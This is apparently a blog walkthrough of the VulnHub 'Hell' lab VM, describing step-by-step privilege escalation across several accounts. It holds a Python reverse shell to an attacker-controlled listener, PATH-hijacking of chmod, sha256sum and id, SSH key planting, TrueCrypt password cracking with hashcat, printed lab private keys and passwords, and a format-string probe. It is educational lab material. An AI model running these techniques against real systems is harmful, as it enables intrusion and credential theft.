.. -rw-r--r-- 1 root mail 709 Jun 18 12:26 message.eml $ cat message.eml -----BEGIN PGP MESSAGE----- Version: BCPG C# v1.6.1.0 hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ 3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX 7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24 rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH 9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD +oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug== =svWU -----END PGP MESSAGE----- I loaded the private GPG key into jacks keyring with:\n$ gpg --import .pgp/pgp.priv gpg: keyring `/home/jack/.gnupg/secring.gpg' created gpg: key 3F18AB0A: secret key imported gpg: key 3F18AB0A: public key \"jack@cowlovers.com\" imported gpg: Total number processed: 1 gpg: imported: 1 (RSA: 1) gpg: secret keys read: 1 gpg: secret keys imported: 1 Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:\n$ gpg /var/mail/jack/received/message.eml You need a passphrase to unlock the secret key for user: \"jack@cowlovers.com\" # used the password g0tmi1k69 found in the MySQL database 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18 gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18 \"jack@cowlovers.com\" gpg: /var/mail/jack/received/message.eml: unknown suffix Enter new filename [text.txt]: gpg: WARNING: message was not integrity protected $ cat text.txt Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed. The password is '4J0WWvL5nS' So, lets ssh in as milk_4_life…\nroot@kali:~# ssh milk_4_life@192.168.56.102 milk_4_life@192.168.56.102's password: Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. $ id uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life) Easy :D\nbecoming george The user milk_4_life has a game in hes home folder.\n$ ls -lah game ---s--x--x 1 george george 5.7K Jun 19 18:24 game $ ./game I'm listening Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with \u0026. At this stage I wanted to run a netstat to see if it is listening on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with ./game \u0026 already running, another instance of ./game errored out, revealing the listening port:\n$ ./game \u0026 I'm listening $ ./game Traceback (most recent call last): File \"/usr/bin/game.py\", line 58, in  tcpSocket.bind((\"0.0.0.0\", 1337)) File \"/usr/lib/python2.7/socket.py\", line 224, in meth return getattr(self._sock,name)(*args) socket.error: [Errno 98] Address already in use Lol nope $ tcp/1337 it is. Lets telnet to this:\nmilk_4_life@hell:~$ telnet 127.0.0.1 1337 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. Type 'START' to begin START Starting... You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723) Quick what's... 397 x 358? 1 Quick what's... 498 x 111? 2 Quick what's... 740 x 772? Final Score: 0 Connection closed by foreign host. milk_4_life@hell:~$ Typing anything other than START would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it. Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):\n#!/usr/bin/python import socket, sys # start a socket sock = socket.socket() # connect locally sock.connect(('127.0.0.1', 1337)) ret = sock.recv(1024) # read 1024 bytes print '[I] %s' % ret.strip() # start the game print '[O] START' sock.send('START\\n') # START the game ret = sock.recv(1024) # read 1024 bytes print '[I] %s' % ret.strip() # Start reading the socket input and calculating answers sending them back while True: ret = sock.recv(1024) print '[I] %s' % ret.strip() # split by spaces ret = ret.split(' ') # a question line if ret[0] == 'Quick': # extract the 2 integers from: # ['Quick', \"what's...\", '435', 'x', '574?', ''] one = int(ret[2]) two = int(ret[4].replace('?','')) # remove the comma answer = one * two print '[O] Answer %s' % answer sock.send(str(answer) + '\\n') # once the 30 seconds passes, a line with Final will return. This # is the end of the game elif ret[0] == 'Final': print 'Done?' sock.close() sys.exit(0) # if we dont know what to do, just 'press enter' else: sock.send('\\n') sock.close() I ran this in another session with ./game running and won :P Once you win, the output results in:\n!*!*!*!*! Congratulations, new high score (302785) !*!*!*!*! I hear the faint sound of chmodding....... … and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by george after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?\nTo test, I fired up another editor on chmod.py and just put a line to echo test. I chmod +x this and moved the file to /tmp. I then added /tmp to PATH via export PATH=/tmp:$PATH:\nmilk_4_life@hell:~$ python chmod.py # test the script Testing chmod exec milk_4_life@hell:~$ cp chmod.py /tmp/chmod # copy it to /tmp milk_4_life@hell:~$ chmod +x /tmp/chmod # make it executable milk_4_life@hell:~$ /tmp/chmod # test it Testing chmod exec milk_4_life@hell:~$ export PATH=/tmp:$PATH # prefix PATH with /tmp milk_4_life@hell:~$ chmod # test it without full path Testing chmod exec milk_4_life@hell:~$ ./game # start the game I'm listening Testing chmod exec # profit :) With it confirmed that chmod was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our chmod script to be slightly more useful:\n#!/usr/bin/python import pty pty.spawn('/bin/sh') With this now in /tmp/chmod, I reran ./game.py, and then ./play_game.py. After 30 seconds on the session we started the game we had:\nmilk_4_life@hell:~$ ./game I'm listening $ id uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life) $ Profit! We now have access to george’s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using ssh-keygen, and added the contents of the resultant id_rsa.pub to .ssh/authorized_keys. Whats important to note in the below snippet is that the full path of chmod is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D\n$ id uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life) $ cd /home/george $ mkdir .ssh $ /bin/chmod 755 .ssh $ cd .ssh $ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali\"  authorized_keys $ /bin/chmod 600 authorized_keys Now we can SSH into the VM as george\nroot@kali:~# ssh george@192.168.56.102 -i id_rsa Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. No mail. Last login: Sat Jul 5 19:26:25 2014 george@hell:~$ becoming bazza George’s home directory had what looked like a TrueCrypt container 4.0M Jun 19 21:09 container.tc in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.\ngeorge also had mail in /var/mail:\ngeorge@hell:~$ cat /var/mail/george/signup.eml From: admin@rockyou.com To: super_admin@hell.com Subject: Account Activation Date: 13th November 2009 Thanks for signing up for your account. I hope you enjoy our services. george@hell:~$ There is a mention of rockyou in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the container.tc to my Kali Linux install, and have truecrack have a go at it while I catch up on some much deserved sleep.\nfast forward a few hours A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this may not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, oclHashcat.\nC:\\Users\\Somedude\\Downloads\\oclHashcat-1.21\\oclHashcat-1.21oclHashcat64.exe -m 6211 C:\\Users\\Somedude\\Desktop\\Hell\\container.tc C:\\Users\\Somedude\\Desktop\\Hell\\rockyou.txt [snip] C:\\Users\\Somedude\\Desktop\\Hell\\container.tc:letsyouupdateyourfunnotesandmore Session.Name...: oclHashcat Status.........: Cracked Input.Mode.....: File (C:\\Users\\Somedude\\Desktop\\Hell\\rockyou.txt) Hash.Target....: File (C:\\Users\\Somedude\\Desktop\\Hell\\container.tc) Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES Time.Started...: Sun Jul 20 14:26:08 2014 (19 secs) Speed.GPU.#1...: 14578 H/s Speed.GPU.#2...: 16165 H/s Speed.GPU.#*...: 30743 H/s Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.......: 563201/14343297 (3.93%) Skipped........: 0/563201 (0.00%) Rejected.......: 1/563201 (0.00%) HWMon.GPU.#1...: 64% Util, 54c Temp, 43% Fan HWMon.GPU.#2...: 0% Util, 90c Temp, 100% Fan Started: Sun Jul 20 14:26:08 2014 Stopped: Sun Jul 20 14:26:42 2014 About 19 seconds later, we have the password thanks to hashcat!\nSo, lets mount the container and see whats inside:\ngeorge@hell:~$ truecrypt container.tc Enter mount directory [default]: Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore Enter keyfile [none]: Protect hidden volume (if any)? (y=Yes/n=No) [No]: george@hell:~$ cd /media/truecrypt1/ george@hell:/media/truecrypt1$ ls -lah total 22K drwx------ 2 george george 16K Jan 1 1970 . drwxr-xr-x 4 root root 4.0K Jul 21 18:50 .. -rwx------ 1 george george 1.7K Jul 5 20:01 id_rsa george@hell:/media/truecrypt1$ cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA 25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG 0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4 GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3 6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7 R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt 2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50 rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM= -----END RSA PRIVATE KEY----- george@hell:/media/truecrypt1$ So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the /etc/passwd. I saved the key to a file on my Kali Linux box and attempted to SSH in as bazza, specifying the private key to use:\nroot@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Jul 21 18:52:50 2014 from 192.168.56.1 $ id uid=1004(bazza) gid=1004(bazza) groups=1004(bazza) $ becoming oj bazza had 2 interesting files in hes home directory:\nbazza@hell:~$ ls -lh total 20K -rw-r--r-- 1 root root 109 Jul 6 18:32 barrebas.txt -r-xr-sr-x 1 oj developers 6.1K Jul 6 18:39 part1 -r-sr-xr-x 1 oj oj 5.2K Jul 6 18:34 part2 The barrebas.txt looks to be a shoutout to the tester of the vulns. part1 \u0026 part2 from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is oj. Running part1 and part2:\nbazza@hell:~$ ./part1 Checking integrity of part2... Done!! Checking integrity of calling target... Done!! Binary and target confirmed. Can't touch this *nah na na na na naaaaaaaa nah* uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza) bazza@hell:~$ ./part2 Error! 1004 ID detected ... youre not allowed to run this, please use part 1! bazza@hell:~$ So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. part1 outputs what looks like the output of the id command too.\nAgain, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.\nWe start with a strings of part1:\nbazza@hell:~$ strings part1 /lib/ld-linux.so.2 __gmon_start__ libc.so.6 _IO_stdin_used puts popen printf fgets system pclose strcmp __libc_start_main GLIBC_2.1 GLIBC_2.0 PTRh QVhl [^_] 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1 /home/bazza/part2 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8 /usr/bin/id Checking integrity of part2... sha256sum /home/bazza/part2 Failed to run command Done!! Checking integrity of calling target... sha256sum /usr/bin/id Uh oh.... Corrupted or in wrong directory (/home/bazza/) Done!! Binary and target confirmed. /home/bazza/part2 Target corrupt ;*2$\" This should give you a pretty good idea of what is potentially going on in the binary, like:\n Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1 Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8 Eventually Fail if these don’t match.  The key lies in the fact that the sha256sum command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the chmod earlier, we are going to do exactly the same with the sha256sum.\nAs before, we create a evil sha256sum command, which is actually just a python script to spawn /bin/sh, then prefix PATH with /tmp and run ./part1. For this one however, I was having trouble with the pty.spawn() and didn’t really feel like troubleshooting that much. So I opted for a (reverse shell)[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet] payload instead to open on a netcat listener that I have on my host laptop:\n#!/usr/bin/python import socket,subprocess,os s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"192.168.56.1\",4444)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([\"/bin/sh\",\"-i\"]) I spawned a netcat listener on my laptop using nc -l 4444, and ran ./part1:\n→ nc -l 4444 $ id uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza) Notice that I was now in the developers group. I was now allowed to run ./part2 too… with a verbose line showing me the permissions I would need to gain access to /home/oj:\n$ ./part2 uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza) Can't touch this *nah na na na na naaaaaaaa nah* $ And, as expected, I spent some time on this binary too. I didn’t expect part2 to be any easier :P After taking a break, I realized that the output that looks like that of /usr/bin/id, probably is that if it. So, off I went and did another sha256sum, type script, this time just with another reverse shell to port 4445, and naming it id so that part2 will pick it up:\n→ nc -l 4445 $ /usr/bin/id uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza) $ cd /home/oj $ ls -lh total 584K -r-sr-xr-x 1 root root 579K Jul 5 21:12 echo -rw-r--r-- 1 root root 154 Jul 5 21:06 How to be an infosec rockstar 101.txt $ And there we are! Group membership for oj, and access to /home/oj\nbecoming root As with all of the other users, I added myself a ssh key for easy access.\nNow, sadly I have to admit that this is as far as I have been able to come. oj has a binary called echo (not to be confused with the builtin echo), that, as expected, will echo what you input.\noj@hell:~$ ./echo onetwothree onetwothree oj@hell:~$ I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a Format String Attack\noj@hell:~$ ./echo %08x.%08x.%08x 080488c0.bffffcf8.00000000 oj@hell:~$ I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.\nEdit: One way to root the machine is to make use of the fact that you can run truecrypt as root, and provide a evil container, spawning you a root shell. An example of this can be seen here (and actually references this VM)\nsummary Hell sure as heck taught me a lot and was one fun experience! Shoutout to @0x42424242 for the time taken to make this VM available.\n","wordCount":"6178","inLanguage":"en","datePublished":"2014-07-20T19:00:46Z","dateModified":"2014-07-20T19:00:46Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
Hell would just not freeze over!
</h1>
<div class=post-meta>July 20, 2014&nbsp;·&nbsp;30 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-07-20-hell-would-just-not-freeze-over.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#welcome-to-hell aria-label="welcome to hell">welcome to hell</a></li>
<li>
<a href=#the-usual-first-steps aria-label="the usual first steps">the usual first steps</a></li>
<li>
<a href=#poking-around aria-label="poking around">poking around</a></li>
<li>
<a href=#the-echo-server aria-label="the echo server">the echo server</a></li>
<li>
<a href=#the-web-server aria-label="the web server">the web server</a></li>
<li>
<a href=#302-content-anyone aria-label="302 content anyone?">302 content anyone?</a></li>
<li>
<a href=#finding-the-web-vuln aria-label="finding the web vuln">finding the web vuln</a></li>
<li>
<a href=#gaining-shell aria-label="gaining shell">gaining shell</a></li>
<li>
<a href=#becoming-jack aria-label="becoming jack">becoming jack</a></li>
<li>
<a href=#becoming-milk_4_life aria-label="becoming milk_4_life">becoming milk_4_life</a></li>
<li>
<a href=#becoming-george aria-label="becoming george">becoming george</a></li>
<li>
<a href=#becoming-bazza aria-label="becoming bazza">becoming bazza</a><ul>
<li>
<a href=#fast-forward-a-few-hours aria-label="fast forward a few hours">fast forward a few hours</a></li></ul>
</li>
<li>
<a href=#becoming-oj aria-label="becoming oj">becoming oj</a></li>
<li>
<a href=#becoming-root aria-label="becoming root">becoming root</a></li>
<li>
<a href=#summary aria-label=summary>summary</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>##foreword
Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get <code>/root/flag.txt</code>, I am yet to actually <em>root</em> this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a <strong>TON</strong> of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get <strong>root</strong>, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)</p>
<h2 id=welcome-to-hell>welcome to hell<a hidden class=anchor aria-hidden=true href=#welcome-to-hell>#</a></h2>
<p><a href=http://vulnhub.com/entry/hell-1,95/>Hell</a> is another vulnerable VM hosted at <a href=https://twitter.com/vulnhub>@VulnHub</a>. After recently completing the <a href=https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/>SkyTower</a> Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging&mldr; The wife was away on a <em>girls weekend out</em>, so I had plenty of time to sit and really think about things without distractions.</p>
<h2 id=the-usual-first-steps>the usual first steps<a hidden class=anchor aria-hidden=true href=#the-usual-first-steps>#</a></h2>
<p>So, like most other CTF type VM&rsquo;s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap --reason 192.168.56.102

Starting Nmap 6.46 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-07-20 19:15 SAST
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.102
Host is up, received reset <span style=color:#f92672>(</span>0.00025s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>996</span> filtered ports
Reason: <span style=color:#ae81ff>996</span> no-responses
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
111/tcp open  rpcbind syn-ack
666/tcp open  doom    syn-ack

Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 4.38 seconds
</code></pre></div><p>So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first <em>whaaat</em> moment, tcp/666.</p>
<h2 id=poking-around>poking around<a hidden class=anchor aria-hidden=true href=#poking-around>#</a></h2>
<p>The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# telnet 192.168.56.102 <span style=color:#ae81ff>666</span>
Trying 192.168.56.102...
Connected to 192.168.56.102.
Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.

Welcome to the Admin Panel
Archiving latest version on webserver <span style=color:#f92672>(</span>echoserver.bak<span style=color:#f92672>)</span>...
Starting echo server and monitoring...
ping
ping
pong
pong
^<span style=color:#f92672>]</span>quit

telnet&gt; quit
Connection closed.
</code></pre></div><p>The line <em>&lsquo;Archiving latest version on webserver (echoserver.bak)&mldr;'</em> hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.</p>
<h2 id=the-echo-server>the echo server<a hidden class=anchor aria-hidden=true href=#the-echo-server>#</a></h2>
<p>From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to <code>echoserver.bak</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# curl  <span style=color:#e6db74>&#34;http://192.168.56.102/echoserver.bak&#34;</span> &gt; echoserver.bak
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>7846</span>  <span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>7846</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>  1290k      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:-- 1532k
root@kali:~# file echoserver.bak
echoserver.bak: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked <span style=color:#f92672>(</span>uses shared libs<span style=color:#f92672>)</span>, <span style=color:#66d9ef>for</span> GNU/Linux 2.6.26, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
</code></pre></div><p>Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation & analysis.
To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I&rsquo;d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a <code>strace</code>, one will notice the server &lsquo;dying&rsquo; when a socket is closed:</p>
